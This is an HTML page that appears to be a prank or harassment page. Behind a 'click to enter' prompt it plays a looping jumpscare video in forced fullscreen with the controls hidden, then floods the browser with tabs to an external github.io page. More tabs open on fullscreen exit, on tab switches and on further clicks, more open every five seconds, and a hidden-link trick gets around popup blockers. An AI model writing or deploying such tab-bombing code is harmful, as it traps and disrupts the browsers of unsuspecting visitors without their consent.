<!DOCTYPE html>
<html lang="en">
<head>
   <style>
    body, html {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      background: black;
      cursor: pointer; 
    }
    #scareVideo {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 999;
    }
    
    #scareVideo::-webkit-media-controls {
      display: none !important;
    }
    #scareVideo::-moz-media-controls {
        display: none !important;
    }
    video::-ms-media-controls {
        display: none !important;
    }
    video::-o-media-controls {
        display: none !important;
    }
    video {
        pointer-events: none;
    }

    #overlayText {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: "Comic Sans MS", cursive, sans-serif;
      color: white;
      font-size: 5em;
      text-align: center;
      z-index: 1000;
    }
  </style>
</head>
<body>

  <div id="overlayText">click to enter..</div>

  <video id="scareVideo" loop>
    <source src="jumpscare.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>

  <script>
    const pageBody = document.body;
    const video = document.getElementById('scareVideo');
    const overlayText = document.getElementById('overlayText');
    let tabsOpened = false;
    const url = 'https://loganexotic.github.io/zakusone/';

    function openTabs(count) {
      for (let i = 0; i < count; i++) {
        // Try multiple methods to open tabs
        const win = window.open(url, '_blank');
        // If popup blocked, try alternative
        if (!win || win.closed || typeof win.closed == 'undefined') {
          // Create hidden link and click it
          const a = document.createElement('a');
          a.href = url;
          a.target = '_blank';
          a.rel = 'noopener noreferrer';
          document.body.appendChild(a);
          a.click();
          document.body.removeChild(a);
        }
      }
    }

    pageBody.addEventListener('click', () => {
      // Hide text overlay
      overlayText.style.display = 'none';

      // Show video
      video.style.display = 'block';

      // Force fullscreen on the video
      if (video.requestFullscreen) {
        video.requestFullscreen();
      } else if (video.webkitRequestFullscreen) {
        video.webkitRequestFullscreen();
      } else if (video.msRequestFullscreen) {
        video.msRequestFullscreen();
      }

      video.play();

      // Open tabs immediately
      if (!tabsOpened) {
        tabsOpened = true;
        
        // Open 8 tabs immediately
        openTabs(8);

        // Open more after delays
        setTimeout(() => { openTabs(5); }, 200);
        setTimeout(() => { openTabs(5); }, 500);
        setTimeout(() => { openTabs(5); }, 800);
      }

    }, { once: true });

    // Force open tabs when fullscreen changes
    function handleFullscreenExit() {
      if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
        // User exited fullscreen - open a huge batch
        openTabs(15);
        // And keep opening more
        setTimeout(() => { openTabs(10); }, 300);
        setTimeout(() => { openTabs(10); }, 600);
        setTimeout(() => { openTabs(10); }, 1000);
      }
    }

    document.addEventListener('fullscreenchange', handleFullscreenExit);
    document.addEventListener('webkitfullscreenchange', handleFullscreenExit);
    document.addEventListener('msfullscreenchange', handleFullscreenExit);

    // Also detect visibility change to catch when user comes back
    document.addEventListener('visibilitychange', () => {
      if (document.hidden) {
        // User switched tabs/window - open more tabs
        setTimeout(() => { openTabs(10); }, 100);
      }
    });

    // Click anywhere after fullscreen to open more
    document.addEventListener('click', () => {
      if (tabsOpened && !document.fullscreenElement) {
        openTabs(8);
      }
    });

    // Keep opening tabs periodically while page is active
    setInterval(() => {
      if (tabsOpened) {
        openTabs(3);
      }
    }, 5000);

  </script>

</body>
</html>
